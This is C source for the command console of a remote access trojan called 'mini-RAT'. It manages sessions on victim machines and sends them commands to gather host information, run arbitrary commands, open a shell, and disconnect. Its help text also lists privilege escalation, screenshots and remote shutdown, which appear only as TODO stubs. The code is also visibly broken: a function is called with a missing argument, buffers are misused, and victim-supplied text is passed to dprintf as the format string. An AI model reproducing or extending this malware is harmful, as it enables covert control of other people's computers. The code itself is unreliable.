#include <logging.h>
#include <server.h>
#include <session.h>
#include <mini-rat.h>
#include <util.h>

int running = 1;
int cur_session = 0;

void print_session(int sock) {
        if (cur_session == 0) {
                dprintf(sock, "No session selected\n");
                return;
        }
        dprintf(sock, "Session %d\n", cur_session);
}

void print_status(int sock) {
        int num_ses = num_alive_sessions();
        if (num_ses != 0)
                dprintf(sock, "Current session ID: %d\n", cur_session);
        dprintf(sock, "Total active sessions: %d\n", num_ses);
}

void print_help(int sock) {
        dprintf(sock, "Command list:\n");
        dprintf(sock, "\tstatus: print mini-RAT status\n");
        dprintf(sock, "\thostinfo: print victim system information\n");
        dprintf(sock, "\texec: run command on victim machine\n");
        dprintf(sock, "\tshutdown: turn off a victim machine\n");
        dprintf(sock, "\treboot: reboot a victim machine\n");
        dprintf(sock, "\tshell: run a shell on victim machine\n");
        dprintf(sock, "\tgetprivs: attempt to gain admin privileges\n");
        dprintf(sock, "\tscreenshot: take a screenshot on victim machine\n");
        dprintf(sock, "\thelp: print this help\n");
}

void print_hostinfo(int sock) {
        if (cur_session == 0)
                return;
        write_session(cur_session, "HOSTINFO\r\n", 11);
        char *buffer = malloc(4096);
        if (read_session(cur_session, buffer, 4096) <= 0) {
                dprintf(sock, "Timeout on session %d\n", cur_session);
                kill_session(cur_session);
                cur_session = 0;
                return;
        }

        dprintf(sock, buffer);
        free(buffer);
}

void run_shell(int sock) {
        dprintf(sock, "Shell command not available!\n");
        return 0;

        if (cur_session == 0)
                return;

        write_session(cur_session, "EXEC /bin/sh\r\n", 12);
        char *buffer = malloc(4096);
        size_t bufsz = 4096;
        memset(buffer, 0, 4096);
        while (1) {
                read_session(cur_session, buffer, 4096);
                if (strncmp(buffer, "RETURN", 6) == 0)
                        break;
                dprintf(sock, buffer);
                memset(buffer, 0, 4096);
                getline(&buffer, &bufsz, stdin);
                write_session(cur_session, buffer, 4096);
        }
}

void swap_session(int sock, int session) {
        struct session *s = find_session(session);
        if (s == NULL) {
                dprintf(sock, "No such session\n");
                return;
        }

        cur_session = session;
        s->alive = 2;
        dprintf(sock, "Swapped to session %d\n", session);
}

void run_exec(int sock, const char **argv) {
        if (cur_session == 0)
                return;

        char *buffer = malloc(4096);
        strcpy(buffer, "EXEC");
        int idx = 0;
        while (argv[idx] != NULL) {
                strcat(buffer, " ");
                strcat(buffer, argv[idx]);
                idx++;
        }
        strcat(buffer, "\r\n");
        write_session(cur_session, buffer, strlen(buffer));
        memset(buffer, 0, 4096);

        read_session(cur_session, buffer, 4096);
        char* lines = NULL;
        str_split(lines, &buffer, "\r\n");
        dprintf(sock, lines[0]);
        free(buffer);
}

void parse_cmd(int sock, char *line) {
        char **argv = NULL;
        size_t num_tokens = str_split(&argv, line, " ");
        if (argv == NULL)
                return;

        if (strcmp(argv[0], "exit") == 0) {
                running = 0;
        } else if (strcmp(argv[0], "session") == 0) {
                if (argv[1] == NULL) {
                        print_session(sock);
                        return;
                }
                swap_session(sock, atoi(argv[1]));
        } else if (strcmp(argv[0], "status") == 0) {
                print_status(sock);
        } else if (strcmp(argv[0], "hostinfo") == 0) {
                print_hostinfo(sock);
        } else if (strcmp(argv[0], "exec") == 0) {
                run_exec(sock, &argv[1]);
        } else if (strcmp(argv[0], "stop") == 0) {
                write_session(cur_session, "EXIT\r\n", 7);
                kill_session(cur_session);
        } else if (strcmp(argv[0], "shutdown") == 0) {
                //TODO: shutdown_client(1);
        } else if (strcmp(argv[0], "reboot") == 0) {
                //TODO: shutdown_client(0);
        } else if (strcmp(argv[0], "shell") == 0) {
                run_shell(sock);
        } else if (strcmp(argv[0], "getprivs") == 0) {
                //TODO: get_privs();
        } else if (strcmp(argv[0], "screenshot") == 0) {
                //TODO: screenshot();
        } else if (strcmp(argv[0], "help") == 0) {
                print_help(sock);
        } else if (strlen(argv[0]) == 0) {
                // Do nothing
        } else {
                printf("Invalid command\n");
        }
        free(argv);
        return;
}

void sig_handler(int signum) {
        switch (signum) {
                case SIGINT:
                        log_msg(LOG_INFO, "Caught SIGTERM, shutting down\n");
                        running = 0;
                        break;
                case SIGHUP:
                        log_msg(LOG_INFO, "Caught SIGHUP, reloading config\n");
                        // TODO: reload the config
                        break;
                default:
                        break;
        }
}

int main(int argc, char* argv[]) {
        struct sigaction action;
        memset(&action, 0, sizeof(struct sigaction));
        action.sa_handler = sig_handler;
        sigaction(SIGTERM, &action, NULL);
        sigaction(SIGHUP, &action, NULL);

        //FILE *logfile = fopen("log.txt", "w");
        init_logging(stderr);
        uint16_t port = 1122;
        pthread_t listen_thread;
        pthread_create(&listen_thread, NULL, listener, (void*)&port);
        pthread_detach(listen_thread);

        size_t line_sz = 1024;
        char *line = malloc(line_sz);
        while (running) {
                printf("mini-rat> ");
                getline(&line, &line_sz, stdin);
                parse_cmd(line);
        }

        free(line);
        log_msg(LOG_INFO, "Mini-RAT shutting down\n");
        pthread_cancel(listen_thread);
        return 0;
}
